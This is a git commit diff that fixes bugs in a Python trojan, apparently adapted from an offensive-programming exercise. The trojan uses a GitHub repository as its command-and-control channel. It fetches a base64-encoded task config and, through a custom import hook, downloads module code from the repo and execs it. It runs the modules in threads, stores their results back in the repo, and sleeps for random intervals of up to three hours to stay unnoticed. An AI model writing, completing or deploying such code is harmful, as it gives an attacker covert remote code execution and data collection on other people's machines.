c0c4b2afdc01ed4ef3218ca8ed821f04b7dbb4b9
maciel-lucas <mac.sil.lucas@gmail.com>
2025-02-20 21:35:43 -0500

    Atualizacao trojan

--- git_trojan_test.py
+++ git_trojan_test.py
@@ -30,12 +30,11 @@ class Trojan:
             'config', self.config_file, self.repo
         )
         config = json.loads(base64.b64decode(config_json))
-
         for task in config:
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
-            return config
-        
+        return config
+
     def module_runner(self, module):
         result = sys.modules[module].run()
         self.store_module_result(result)
@@ -54,24 +53,23 @@ class Trojan:
             for task in config:
                 thread = threading.Thread(
                     target=self.module_runner,
-                    args=(task['module'],)
-                )
+                    args=(task['module'],))
                 thread.start()
-                time.sleep(random.randint(1,10))
-                time.sleep(random.randint(30*60, 3*60*60))
+                time.sleep(random.randint(1, 10))
+            time.sleep(random.randint(30 * 60, 3 * 60 * 60))
 
 class GitImporter:
     def __init__(self):
         self.current_module_code = ""
 
-    def find_modules(self, name, path=None):
-        print("[*] Tentando recuperar %d" % name)
+    def find_spec(self, name, path=None, target=None): # Corrigido para find_spec
+        print(f"[*] Tentando recuperar {name}")
         self.repo = github_connect()
-
         new_library = get_file_contents('modules', f'{name}.py', self.repo)
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
-            return self
+            return importlib.util.spec_from_loader(name, loader=self, origin=self.repo.git_url)
+        return None
 
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
@@ -79,8 +77,8 @@ class GitImporter:
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
-            
+
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    trojan = Trojan('abc.json')
+    trojan = Trojan('abc')
     trojan.run()
